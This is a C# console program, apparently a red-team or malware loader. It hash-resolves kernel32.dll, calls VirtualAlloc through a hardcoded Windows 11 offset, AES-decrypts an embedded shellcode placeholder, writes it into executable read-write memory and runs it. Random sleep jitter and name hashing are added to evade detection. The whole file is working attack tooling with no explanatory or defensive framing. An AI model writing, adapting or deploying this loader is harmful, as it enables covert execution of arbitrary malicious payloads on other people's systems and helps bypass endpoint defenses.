using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Collections;
using System.Runtime.Versioning;
using System.Xml.Linq;

namespace ConsoleApp1
{
    class Program
    {
        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }
        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr MyVirutalAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void ShellCodeFunc();

        private static string DecryptDataWithAes(string cipherText, string keyBase64, string vectorBase64)
        {
            using (Aes aesAlgorithm = Aes.Create())
            {
                aesAlgorithm.Key = Convert.FromBase64String(keyBase64);
                aesAlgorithm.IV = Convert.FromBase64String(vectorBase64);

                Console.WriteLine($"Aes Cipher Mode : {aesAlgorithm.Mode}");
                Console.WriteLine($"Aes Padding Mode: {aesAlgorithm.Padding}");
                Console.WriteLine($"Aes Key Size : {aesAlgorithm.KeySize}");
                Console.WriteLine($"Aes Block Size : {aesAlgorithm.BlockSize}");


                // Create decryptor object
                ICryptoTransform decryptor = aesAlgorithm.CreateDecryptor();

                byte[] cipher = Convert.FromBase64String(cipherText);

                //Decryption will be done in a memory stream through a CryptoStream object
                using (MemoryStream ms = new MemoryStream(cipher))
                {
                    using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader(cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }
        public static string HttpConnect(string url)
        {
            HttpClient _httpClient = new HttpClient();
            try
            {
                HttpResponseMessage response = _httpClient.GetAsync(url).Result;
                response.EnsureSuccessStatusCode();
                string responseBody = response.Content.ReadAsStringAsync().Result;
                return responseBody;
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine($"Error fetching data: {e.Message}");
                return null;
            }
        }
        public static void SleepJitter(int minDelayMilliseconds, int maxDelayMilliseconds)
        {
            Console.WriteLine("Time measuring.");
            Random random = new Random();
            int delay = random.Next(minDelayMilliseconds, maxDelayMilliseconds);
            Thread.Sleep(delay); // Apply the random delay
        }

        public static void CheckIfInternetAccessible()
        {

            var url = "https://www.microsoft.com/en-us/windows";
            using (var httpClient = new HttpClient())
            {
                try
                {
                    var response = httpClient.GetAsync(url).Result;
                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("Microsoft Update site is available.");
                    }
                    else
                    {
                        Console.WriteLine($"Microsoft Update site might be having issues. Status code: {response.StatusCode}");
                        Environment.Exit(3);
                    }
                }
                catch (AggregateException ae)
                {
                    Console.WriteLine($"Error checking site availability: {ae.Flatten().Message}");
                    Environment.Exit(3);
                }
            }
        }

        public static string HashString(string text, string salt = "")
        {
            if (String.IsNullOrEmpty(text))
            {
                return String.Empty;
            }
            using (var sha = new System.Security.Cryptography.SHA256Managed())
            {
                byte[] textBytes = System.Text.Encoding.UTF8.GetBytes(text + salt);
                byte[] hashBytes = sha.ComputeHash(textBytes);

                string hash = BitConverter
                    .ToString(hashBytes)
                    .Replace("-", String.Empty);

                return hash;
            }
        }
        // sha256("kernel32.dll") = 10BE51B36E2184A002A6EEEC336A3D6C9AE5B45249A8F0A7D432A57C29D9A2BE
        public static nint FindModuleBaseAddressByModuleNameHash(string hashOfFunctionName = "10BE51B36E2184A002A6EEEC336A3D6C9AE5B45249A8F0A7D432A57C29D9A2BE") 
        {
            Process currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
                if (HashString(module.ModuleName) == hashOfFunctionName)
                    return module.BaseAddress;
            return 0;
        }
        static void Main()
        {
            CheckIfInternetAccessible();            
            // 0x13BF0 - offset to virtualalloc in kernell32.dll in win 11
            MyVirutalAlloc myVirutalAlloc = (MyVirutalAlloc)Marshal.GetDelegateForFunctionPointer((FindModuleBaseAddressByModuleNameHash() + 0x13BF0), typeof(MyVirutalAlloc));
            string shellCodeCipherText = "<shellcodeHere>";
            var keyBase64 = "<AESKey";
            var vectorBase64 = "<AESIV>";
            string shellCode = DecryptDataWithAes(shellCodeCipherText, keyBase64, vectorBase64);

            SleepJitter(1, 15);

            string first10 = shellCode.Substring(0, 10);
            string last10 = shellCode.Substring(shellCode.Length - 10);
            // For debug to check if shellcode is properly decrypted
            Console.WriteLine($"First 10 characters: {first10}");
            Console.WriteLine($"Last 10 characters: {last10}");
            
            byte[] buf = Convert.FromBase64String(shellCode);

            SleepJitter(2, 15);

            SleepJitter(5, 15);
            IntPtr ShellCodeFuncAddress = myVirutalAlloc(IntPtr.Zero, (uint)buf.Length, (uint)StateEnum.MEM_COMMIT, (uint)Protection.PAGE_EXECUTE_READWRITE);
            SleepJitter(3, 15);

            SleepJitter(3, 15);
            Marshal.Copy(buf, 0, ShellCodeFuncAddress, buf.Length);
            SleepJitter(3, 15);
            ShellCodeFunc runShellCodeFunc = Marshal.GetDelegateForFunctionPointer<ShellCodeFunc>(ShellCodeFuncAddress);
            SleepJitter(3, 15);
            runShellCodeFunc();
        }
    }
}